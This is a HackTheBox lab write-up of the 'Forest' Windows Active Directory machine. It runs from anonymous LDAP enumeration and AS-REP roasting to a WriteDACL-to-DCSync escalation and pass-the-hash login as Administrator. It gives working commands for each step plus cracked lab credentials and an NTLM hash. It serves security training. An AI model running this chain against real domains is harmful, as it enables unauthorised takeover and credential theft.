---
title: "HTB - Forest (Easy | Windows | Active Directory)"
date: 2026-09-28 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, ldap, ldap-anonymous-bind, nxc, netexec, as-rep-roasting, getnpusers, john, bloodhound, evil-winrm, writedacl, dcsync-attack, powerview, secretsdump, pass-the-hash]
description: "LDAP anonymous bind enumerates users, AS-REP roast svc-alfresco with GetNPUsers and crack it with John, WinRM in, then abuse WriteDACL to grant DCSync rights and secretsdump the Administrator hash for pass-the-hash"
image:
  path: /assets/img/forest.png
---

## **Recon**


```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-30 20:51:28Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-09-30T13:52:30-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
```

### Service Discovery Analysis

The Nmap scan reveals a Windows Server 2016 Active Directory environment:

- **DNS (Port 53):** Simple DNS Plus — standard AD DNS
- **Kerberos (Port 88):** Confirms Active Directory environment
- **SMB (Port 139, 445):** Windows Server 2016 Standard — message signing required; guest auth noted
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **RPC (Port 135, 593):** Windows RPC endpoints
- **WinRM (Port 5985, 47001):** Windows Remote Management — if credentials obtained, direct shell access
- **RPC (Multiple high ports):** Various Windows RPC endpoints

**Domain:** htb.local **Hostname:** FOREST / FOREST.htb.local **OS:** Windows Server 2016 Standard 14393

The key observation here is the combination of **LDAP anonymous bind** (suggested by guest auth in SMB) and **WinRM open on port 5985**. With no web application exposed, the entire attack surface is AD-based — user enumeration via LDAP, AS-REP Roasting via Kerberos, and privilege escalation through AD ACL abuse. We add the domain to `/etc/hosts`:

```bash
echo "<target> htb.local forest.htb.local" | sudo tee -a /etc/hosts
```

---

## **User**

### LDAP Anonymous Enumeration

### Overview - LDAP Anonymous Bind

**What is LDAP Anonymous Bind?** LDAP (Lightweight Directory Access Protocol) is used by Active Directory to expose directory information. By default, some AD configurations allow unauthenticated (anonymous) LDAP queries — a legacy feature from older directory standards. When enabled, any unauthenticated client can query LDAP for user accounts, groups, computers, and other AD objects without providing credentials.

**Why is this dangerous?** Anonymous LDAP access lets an attacker enumerate all domain users without any credentials. These usernames can then be used as input for further attacks like password spraying, AS-REP Roasting, or Kerberoasting — turning an information disclosure into initial access.

We query LDAP anonymously using netexec to enumerate all user accounts. The `--query` flag sends a raw LDAP filter (`(objectClass=user)`) and returns the `sAMAccountName` attribute (the login username) for each result:

```bash
netexec ldap <target> -u '' -p '' --query "(objectClass=user)" "sAMAccountName"
```

![](/assets/img/forest/Pasted_image_20260930181117.png)

A list of domain usernames is returned. We save them to `users.txt` for use in subsequent attacks.

### Overview - AS-REP Roasting

**What is AS-REP Roasting?** In Kerberos authentication, the first step is an Authentication Server Request (AS-REQ) where the client proves their identity. Normally, this requires the user to encrypt a timestamp with their password hash (pre-authentication). However, if the **"Do not require Kerberos preauthentication"** flag is set on a user account, the KDC will respond to any AS-REQ for that user with an AS-REP — a message partially encrypted with the user's password hash.

**The attack:** An attacker can request an AS-REP for any account with pre-authentication disabled, receive the encrypted response, and attempt to crack the password hash offline without ever needing to touch the account's actual password. This works because the KDC sends the encrypted data before verifying the requester's identity.

**Why would this flag be set?** Some legacy applications (like Alfresco, an enterprise content management platform) don't support Kerberos pre-authentication and require this flag to be enabled. Service accounts for such applications are common AS-REP Roasting targets.

### AS-REP Roasting with GetNPUsers

We use `impacket-GetNPUsers` to request AS-REP hashes for all users in our list. The `-no-pass` flag skips password authentication (since we have none), and `-usersfile` provides the list of usernames to test. The `faketime` wrapper corrects clock skew with the DC to ensure valid Kerberos timestamps:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-GetNPUsers -dc-ip <target> htb.local/ -no-pass -usersfile users.txt
```

![](/assets/img/forest/Pasted_image_20260930181254.png)

The user `svc-alfresco` has pre-authentication disabled — confirming it's a service account for the Alfresco CMS. An AS-REP hash is returned for offline cracking.

### Cracking the AS-REP Hash

We crack the AS-REP hash using John the Ripper against rockyou.txt:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/forest/Pasted_image_20260930181411.png)

**svc-alfresco credentials:** `svc-alfresco:s3rvice`

### BloodHound Collection

With valid credentials we collect Active Directory data using BloodHound Python for privilege escalation path analysis:

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local --zip -c All -ns <target>
```

After uploading the zip to BloodHound, the graph reveals two critical findings:

![](/assets/img/forest/Pasted_image_20260930182347.png)

![](/assets/img/forest/Pasted_image_20260930182359.png)

- `svc-alfresco` is a member of the **Account Operators** group
- The **Account Operators** group has **GenericAll** over the **Exchange Windows Permissions** group
- The **Exchange Windows Permissions** group has **WriteDACL** on the domain `htb.local`

This is a complete privilege escalation chain: Account Operators → Exchange Windows Permissions → WriteDACL → DCSync.

### WinRM Access as svc-alfresco

We connect via evil-winrm using the cracked credentials:

```bash
evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
```

![](/assets/img/forest/Pasted_image_20260930182518.png)

A PowerShell session is established as svc-alfresco. The user flag can now be retrieved.

---

## **Root**

## **Root**

BloodHound reveals that the **Exchange Windows Permissions** group has WriteDACL over the domain `htb.local`:

![](/assets/img/forest/Pasted_image_20260930182923.png)

The user `svc-alfresco` is a member of the **Account Operators** group:

![](/assets/img/forest/Pasted_image_20260930183333.png)

Account Operators has GenericAll over the **Exchange Windows Permissions** group — meaning we can add any user to it, inheriting its WriteDACL right on the domain:

![](/assets/img/forest/Pasted_image_20260930183401.png)

### Overview - WriteDACL → DCSync Attack Chain

**What is WriteDACL?** DACL (Discretionary Access Control List) defines which principals can access an object and what permissions they have in Active Directory. WriteDACL privilege allows modifying these permissions — meaning an attacker with WriteDACL on the domain object can grant themselves any AD right, including **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** (the rights required for DCSync).

**What is DCSync?** DCSync is an attack that mimics the behavior of a Domain Controller during AD replication. A DC can request password hashes from another DC using the `MS-DRSR` protocol. By granting ourselves DCSync rights (DS-Replication-*), we can use impacket's `secretsdump` to request all password hashes from the DC as if we were another DC — without touching `lsass.exe` or any process on the target.

**The full chain:**

1. `svc-alfresco` → **Account Operators** (built-in group membership)
2. Account Operators → **GenericAll on Exchange Windows Permissions** (can add members)
3. Exchange Windows Permissions → **WriteDACL on htb.local** (group permission on domain object)
4. WriteDACL → **Grant ourselves DCSync rights** (via PowerView)
5. DCSync → **Extract all NTLM hashes** → Administrator access

### Step 1: Create a New Domain User

From the evil-winrm session as svc-alfresco, we leverage Account Operators membership to create a new domain user. Account Operators can create users and add them to most groups except Domain Admins and Administrators:

powershell

```powershell
net user kali Password123@! /add /domain
```

### Step 2: Add New User to Exchange Windows Permissions

We add our new user to the Exchange Windows Permissions group, inheriting its WriteDACL right on the domain object:

powershell

```powershell
net group "Exchange Windows Permissions" kali /add /domain
```

![](/assets/img/forest/Pasted_image_20260930184050.png)

### Step 3: Grant DCSync Rights via PowerView

We load PowerView into memory and create a credential object for our new user. Then we use `Add-DomainObjectAcl` to inject DCSync Access Control Entries (ACEs) onto the domain object — granting `kali` the DS-Replication rights needed for DCSync:

powershell

```powershell
Import-Module ./powerview.ps1
$SecPassword = ConvertTo-SecureString 'Password123@!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\kali', $SecPassword)
```

The `Add-DomainObjectAcl` function modifies the domain object's DACL using `kali`'s credentials (which now have WriteDACL via Exchange Windows Permissions). The `-Rights DCSync` shorthand grants both `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`:

powershell

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kali -Rights DCSync -Verbose
```

![](/assets/img/forest/Pasted_image_20260930184519.png)

The ACEs are successfully added to the domain object.

### Step 4: DCSync Attack

From our Linux attacker machine, we use `impacket-secretsdump` to perform the DCSync attack as `kali`. The `-just-dc-user Administrator` flag limits the dump to only the Administrator hash, reducing noise. The tool connects to the DC and replicates the Administrator's NTLM hash as if it were another domain controller:

bash

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-secretsdump htb.local/kali:'Password123@!'@<target> -just-dc-user Administrator
```

![](/assets/img/forest/Pasted_image_20260930184550.png)

**Administrator NTLM Hash:** `32693b11e6aa90eb43d32c72a07ceea6`

### Step 5: Pass-the-Hash - Administrator Access

We use the extracted NTLM hash to authenticate as Administrator via evil-winrm. The `-H` flag specifies the NT hash for pass-the-hash authentication — no plaintext password required:

bash

```bash
evil-winrm -i htb.local -u 'Administrator' -H 32693b11e6aa90eb43d32c72a07ceea6
```

![](/assets/img/forest/Pasted_image_20260930184755.png)

Full domain administrator access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified Windows Server 2016 AD environment with LDAP, Kerberos, SMB, and WinRM; guest auth on SMB suggested possible anonymous LDAP access
2. **LDAP Anonymous Enumeration:** Queried LDAP anonymously via netexec to enumerate all domain user accounts; saved usernames to `users.txt`
3. **AS-REP Roasting:** Used `impacket-GetNPUsers` against all discovered users; identified `svc-alfresco` with Kerberos pre-authentication disabled; captured AS-REP hash
4. **Hash Cracking:** Cracked AS-REP hash with John the Ripper and rockyou.txt, obtaining `svc-alfresco:s3rvice`
5. **BloodHound Collection:** Collected AD data as svc-alfresco; identified escalation chain: Account Operators → GenericAll on Exchange Windows Permissions → WriteDACL on htb.local
6. **WinRM Access:** Connected via evil-winrm as svc-alfresco; retrieved user flag
7. **New User Creation:** Used Account Operators membership to create domain user `kali`
8. **Group Membership:** Added `kali` to Exchange Windows Permissions group, inheriting WriteDACL on the domain object
9. **DCSync Rights:** Used PowerView's `Add-DomainObjectAcl` with `kali`'s credentials to inject DS-Replication ACEs on the domain object
10. **DCSync Attack:** Used `impacket-secretsdump` from Linux to replicate Administrator's NTLM hash from the DC
11. **Pass-the-Hash:** Authenticated as Administrator via evil-winrm using extracted NTLM hash and retrieved root flag